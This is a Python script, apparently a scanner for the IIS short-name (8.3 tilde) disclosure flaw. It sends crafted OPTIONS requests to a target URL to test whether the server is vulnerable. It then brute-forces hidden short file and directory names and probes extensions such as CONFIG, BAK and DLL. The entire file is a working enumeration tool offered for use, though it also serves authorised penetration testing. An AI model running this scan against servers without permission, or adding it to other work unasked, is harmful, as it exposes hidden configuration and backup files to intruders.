#!/usr/bin/env python3

import requests
import string
import sys
import time

charset = string.ascii_uppercase + string.digits
extensions = ["ASPX","ASP","CS","CONFIG","TXT","BAK","ZIP","DLL"]

requests_sent = 0
dirs = []
files = []

def request(method, url):
    global requests_sent
    requests_sent += 1
    try:
        r = requests.request(method, url, timeout=5, allow_redirects=False)
        return r.status_code, len(r.text)
    except:
        return None, None

def check_vulnerable(target):
    url1 = f"{target}/*~1*/.aspx"
    url2 = f"{target}/random123/.aspx"

    r1 = request("OPTIONS", url1)
    r2 = request("OPTIONS", url2)

    if r1 != r2:
        return True
    return False


def brute_prefix(target):
    found = []

    for c in charset:
        prefix = c
        url = f"{target}/{prefix}*~1*/.aspx"
        code, _ = request("OPTIONS", url)

        if code and code != 404:
            found.append(prefix)

    return found


def expand_name(target, prefix):

    name = prefix

    for _ in range(5):
        for c in charset:
            attempt = name + c
            url = f"{target}/{attempt}*~1*/.aspx"
            code, _ = request("OPTIONS", url)

            if code and code != 404:
                name = attempt
                break

    return name


def check_extensions(target, name):

    results = []

    for ext in extensions:
        url = f"{target}/{name}~1.{ext}"
        code, _ = request("OPTIONS", url)

        if code and code != 404:
            results.append(ext)

    return results


def main():

    if len(sys.argv) != 2:
        print("Usage: python3 scanner.py http://target/")
        return

    target = sys.argv[1].rstrip("/")

    print(f"# IIS Short Name (8.3) Scanner - scan initiated {time.strftime('%Y/%m/%d %H:%M:%S')}")
    print(f"Target: {target}")

    if not check_vulnerable(target):
        print("|_ Result: Not vulnerable")
        return

    print("|_ Result: Vulnerable!")
    print("|_ Used HTTP method: OPTIONS")
    print("|_ Suffix (magic part): /~1/")

    prefixes = brute_prefix(target)

    for p in prefixes:

        name = expand_name(target, p)

        exts = check_extensions(target, name)

        if exts:
            for e in exts:
                files.append(f"{name}~1.{e}")
        else:
            dirs.append(f"{name}~1")

    print("|_ Extra information:")
    print(f"  |_ Number of sent requests: {requests_sent}")
    print(f"  |_ Identified directories: {len(dirs)}")

    for d in dirs:
        print(f"    |_ {d}")

    print(f"  |_ Identified files: {len(files)}")

    for f in files:
        print(f"    |_ {f}")


if __name__ == "__main__":
    main()
